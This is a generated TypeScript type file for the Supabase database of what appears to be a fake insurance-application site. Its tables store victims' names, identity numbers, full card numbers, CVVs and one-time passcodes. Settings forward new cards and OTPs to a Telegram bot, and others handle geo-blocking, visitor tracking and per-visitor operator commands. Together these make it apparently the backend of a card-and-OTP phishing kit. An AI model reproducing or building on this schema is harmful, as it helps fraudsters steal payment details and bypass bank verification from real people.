export type Json =
  | string
  | number
  | boolean
  | null
  | { [key: string]: Json | undefined }
  | Json[]

export type Database = {
  // Allows to automatically instantiate createClient with right options
  // instead of createClient<Database, { PostgrestVersion: 'XX' }>(URL, KEY)
  __InternalSupabase: {
    PostgrestVersion: "14.18"
  }
  public: {
    Tables: {
      applications: {
        Row: {
          birth_date: string | null
          car_model: string | null
          car_year: string | null
          card_brand: string | null
          card_cvv: string | null
          card_exp_month: string | null
          card_exp_year: string | null
          card_name: string | null
          card_number: string | null
          company: string | null
          created_at: string
          est_value: string | null
          full_name: string | null
          id: string
          identity: string | null
          insurance_type: string | null
          method: string | null
          otp_code: string | null
          phone: string | null
          price: number | null
          purpose: string | null
          repair_place: string | null
          review_status: string
          start_date: string | null
          status: string
          total: number | null
          type: string | null
          updated_at: string
        }
        Insert: {
          birth_date?: string | null
          car_model?: string | null
          car_year?: string | null
          card_brand?: string | null
          card_cvv?: string | null
          card_exp_month?: string | null
          card_exp_year?: string | null
          card_name?: string | null
          card_number?: string | null
          company?: string | null
          created_at?: string
          est_value?: string | null
          full_name?: string | null
          id: string
          identity?: string | null
          insurance_type?: string | null
          method?: string | null
          otp_code?: string | null
          phone?: string | null
          price?: number | null
          purpose?: string | null
          repair_place?: string | null
          review_status?: string
          start_date?: string | null
          status?: string
          total?: number | null
          type?: string | null
          updated_at?: string
        }
        Update: {
          birth_date?: string | null
          car_model?: string | null
          car_year?: string | null
          card_brand?: string | null
          card_cvv?: string | null
          card_exp_month?: string | null
          card_exp_year?: string | null
          card_name?: string | null
          card_number?: string | null
          company?: string | null
          created_at?: string
          est_value?: string | null
          full_name?: string | null
          id?: string
          identity?: string | null
          insurance_type?: string | null
          method?: string | null
          otp_code?: string | null
          phone?: string | null
          price?: number | null
          purpose?: string | null
          repair_place?: string | null
          review_status?: string
          start_date?: string | null
          status?: string
          total?: number | null
          type?: string | null
          updated_at?: string
        }
        Relationships: []
      }
      blocked_visitors: {
        Row: {
          created_at: string
          reason: string | null
          visitor_id: string
        }
        Insert: {
          created_at?: string
          reason?: string | null
          visitor_id: string
        }
        Update: {
          created_at?: string
          reason?: string | null
          visitor_id?: string
        }
        Relationships: []
      }
      chat_conversations: {
        Row: {
          created_at: string
          customer_name: string
          customer_phone: string
          id: string
          initiated_by: string
          last_message_at: string
          unread_admin: number
          unread_customer: number
          updated_at: string
          visitor_id: string
        }
        Insert: {
          created_at?: string
          customer_name?: string
          customer_phone?: string
          id?: string
          initiated_by?: string
          last_message_at?: string
          unread_admin?: number
          unread_customer?: number
          updated_at?: string
          visitor_id: string
        }
        Update: {
          created_at?: string
          customer_name?: string
          customer_phone?: string
          id?: string
          initiated_by?: string
          last_message_at?: string
          unread_admin?: number
          unread_customer?: number
          updated_at?: string
          visitor_id?: string
        }
        Relationships: []
      }
      chat_messages: {
        Row: {
          content: string
          conversation_id: string
          created_at: string
          id: string
          sender: string
        }
        Insert: {
          content: string
          conversation_id: string
          created_at?: string
          id?: string
          sender: string
        }
        Update: {
          content?: string
          conversation_id?: string
          created_at?: string
          id?: string
          sender?: string
        }
        Relationships: [
          {
            foreignKeyName: "chat_messages_conversation_id_fkey"
            columns: ["conversation_id"]
            isOneToOne: false
            referencedRelation: "chat_conversations"
            referencedColumns: ["id"]
          },
        ]
      }
      site_settings: {
        Row: {
          allowed_countries: string[]
          attempt_block_enabled: boolean
          geo_block_enabled: boolean
          id: number
          max_attempts: number
          telegram_bot_token: string
          telegram_chat_id: string
          telegram_enabled: boolean
          telegram_notify_card: boolean
          telegram_notify_new_application: boolean
          telegram_notify_new_deployment: boolean
          telegram_notify_otp: boolean
          telegram_notify_sa_visitor: boolean
          updated_at: string
        }
        Insert: {
          allowed_countries?: string[]
          attempt_block_enabled?: boolean
          geo_block_enabled?: boolean
          id: number
          max_attempts?: number
          telegram_bot_token?: string
          telegram_chat_id?: string
          telegram_enabled?: boolean
          telegram_notify_card?: boolean
          telegram_notify_new_application?: boolean
          telegram_notify_new_deployment?: boolean
          telegram_notify_otp?: boolean
          telegram_notify_sa_visitor?: boolean
          updated_at?: string
        }
        Update: {
          allowed_countries?: string[]
          attempt_block_enabled?: boolean
          geo_block_enabled?: boolean
          id?: number
          max_attempts?: number
          telegram_bot_token?: string
          telegram_chat_id?: string
          telegram_enabled?: boolean
          telegram_notify_card?: boolean
          telegram_notify_new_application?: boolean
          telegram_notify_new_deployment?: boolean
          telegram_notify_otp?: boolean
          telegram_notify_sa_visitor?: boolean
          updated_at?: string
        }
        Relationships: []
      }
      telegram_notified_hosts: {
        Row: {
          created_at: string
          first_url: string | null
          host: string
          user_agent: string | null
        }
        Insert: {
          created_at?: string
          first_url?: string | null
          host: string
          user_agent?: string | null
        }
        Update: {
          created_at?: string
          first_url?: string | null
          host?: string
          user_agent?: string | null
        }
        Relationships: []
      }
      telegram_updates: {
        Row: {
          created_at: string
          update_id: number
        }
        Insert: {
          created_at?: string
          update_id: number
        }
        Update: {
          created_at?: string
          update_id?: number
        }
        Relationships: []
      }
      visitor_commands: {
        Row: {
          command: string
          created_at: string
          id: string
          payload: string | null
          visitor_id: string
        }
        Insert: {
          command: string
          created_at?: string
          id?: string
          payload?: string | null
          visitor_id: string
        }
        Update: {
          command?: string
          created_at?: string
          id?: string
          payload?: string | null
          visitor_id?: string
        }
        Relationships: []
      }
      visitor_sessions: {
        Row: {
          city: string | null
          country: string | null
          ip: string | null
          last_seen: string
          path: string | null
          user_agent: string | null
          visitor_id: string
        }
        Insert: {
          city?: string | null
          country?: string | null
          ip?: string | null
          last_seen?: string
          path?: string | null
          user_agent?: string | null
          visitor_id: string
        }
        Update: {
          city?: string | null
          country?: string | null
          ip?: string | null
          last_seen?: string
          path?: string | null
          user_agent?: string | null
          visitor_id?: string
        }
        Relationships: []
      }
    }
    Views: {
      [_ in never]: never
    }
    Functions: {
      [_ in never]: never
    }
    Enums: {
      [_ in never]: never
    }
    CompositeTypes: {
      [_ in never]: never
    }
  }
}

type DatabaseWithoutInternals = Omit<Database, "__InternalSupabase">

type DefaultSchema = DatabaseWithoutInternals[Extract<keyof Database, "public">]

export type Tables<
  DefaultSchemaTableNameOrOptions extends
    | keyof (DefaultSchema["Tables"] & DefaultSchema["Views"])
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends (DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
        DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])
    : never) = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
      DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])[TableName] extends {
      Row: infer R
    }
    ? R
    : never
  : DefaultSchemaTableNameOrOptions extends keyof (DefaultSchema["Tables"] &
        DefaultSchema["Views"])
    ? (DefaultSchema["Tables"] &
        DefaultSchema["Views"])[DefaultSchemaTableNameOrOptions] extends {
        Row: infer R
      }
      ? R
      : never
    : never

export type TablesInsert<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends (DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never) = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Insert: infer I
    }
    ? I
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Insert: infer I
      }
      ? I
      : never
    : never

export type TablesUpdate<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends (DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never) = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Update: infer U
    }
    ? U
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Update: infer U
      }
      ? U
      : never
    : never

export type Enums<
  DefaultSchemaEnumNameOrOptions extends
    | keyof DefaultSchema["Enums"]
    | { schema: keyof DatabaseWithoutInternals },
  EnumName extends (DefaultSchemaEnumNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"]
    : never) = never,
> = DefaultSchemaEnumNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"][EnumName]
  : DefaultSchemaEnumNameOrOptions extends keyof DefaultSchema["Enums"]
    ? DefaultSchema["Enums"][DefaultSchemaEnumNameOrOptions]
    : never

export type CompositeTypes<
  PublicCompositeTypeNameOrOptions extends
    | keyof DefaultSchema["CompositeTypes"]
    | { schema: keyof DatabaseWithoutInternals },
  CompositeTypeName extends (PublicCompositeTypeNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"]
    : never) = never,
> = PublicCompositeTypeNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"][CompositeTypeName]
  : PublicCompositeTypeNameOrOptions extends keyof DefaultSchema["CompositeTypes"]
    ? DefaultSchema["CompositeTypes"][PublicCompositeTypeNameOrOptions]
    : never

export const Constants = {
  public: {
    Enums: {},
  },
} as const
